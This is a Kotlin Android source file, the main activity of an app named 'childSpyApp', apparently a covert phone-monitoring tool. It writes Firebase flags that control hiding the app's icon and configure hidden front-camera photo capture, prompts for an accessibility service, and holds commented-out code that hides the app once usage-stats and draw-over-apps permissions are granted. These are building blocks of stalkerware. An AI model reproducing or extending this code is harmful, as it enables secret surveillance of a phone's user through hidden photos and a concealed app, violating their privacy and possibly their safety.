package sammy.mutahi.gicheru.childSpyApp.ui.main

import android.os.Bundle
import android.widget.Button

import sammy.mutahi.gicheru.childSpyApp.data.model.ChildPhoto
import sammy.mutahi.gicheru.childSpyApp.data.rxFirebase.InterfaceFirebase
import sammy.mutahi.gicheru.childSpyApp.ui.base.BaseActivity
import sammy.mutahi.gicheru.childSpyApp.utils.AsyncTaskEnableAccessibility
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.CHILD_PERMISSION
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.CHILD_SHOW_APP
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.DATA
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.PARAMS
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.PHOTO
import sammy.mutahi.gicheru.childSpyApp.utils.hiddenCameraServiceUtils.HiddenCameraUtils.canOverDrawOtherApps
import sammy.mutahi.gicheru.childSpyApp.utils.hiddenCameraServiceUtils.HiddenCameraUtils.openDrawOverPermissionSetting
import sammy.mutahi.gicheru.childSpyApp.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.google.firebase.database.DatabaseReference
import kotterknife.bindView
import javax.inject.Inject
import android.widget.RelativeLayout
import android.widget.Switch
import sammy.mutahi.gicheru.childSpyApp.R
import sammy.mutahi.gicheru.childSpyApp.utils.ConstFun.openUseAccessSettings
import sammy.mutahi.gicheru.childSpyApp.utils.checkForegroundApp.CheckPermission.hasUsageStatsPermission


class MainActivity : BaseActivity() {

    private val btnEnableService: RelativeLayout by bindView(R.id.btn_enable_service)

    @Inject
    lateinit var firebase: InterfaceFirebase

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        getComponent()!!.inject(this)
        init()
        onClickApp()
    }

    override fun onResume() {
        super.onResume()
    }

    private fun init() {

        getReference("$DATA/$CHILD_SHOW_APP").setValue(true)

        //photo
        val childPhoto = ChildPhoto(false, CameraFacing.FRONT_FACING_CAMERA)
        getReference("$PHOTO/$PARAMS").setValue(childPhoto)
        getReference("$PHOTO/$CHILD_PERMISSION").setValue(true)

    }


    private fun onClickApp() {
        /*btnHideApp.setOnClickListener {
            checkPermissions()
        }*/
        btnEnableService.setOnClickListener {
            showAlertDialog(R.string.msg_dialog_enable_accessibility_service, android.R.string.ok) {
                dismiss()
                AsyncTaskEnableAccessibility(this@MainActivity).execute()
            }
        }
    }

    private fun getReference(child: String): DatabaseReference = firebase.getDatabaseReference(child)

    private fun checkPermissions() {
        if (hasUsageStatsPermission()) {
            if (canOverDrawOtherApps()) {
                getReference("$DATA/$CHILD_SHOW_APP").setValue(false)
                showLoading(getString(R.string.hiding))
            } else showAlertDialog(R.string.msg_dialog_enable_overdraw, R.string.go_to_setting) { openDrawOverPermissionSetting() }
        } else showAlertDialog(R.string.msg_dialog_enable_usage_stats, R.string.go_to_setting) { openUseAccessSettings() }

    }

    override fun onDestroy() {
        hideLoading()
        super.onDestroy()
    }
}
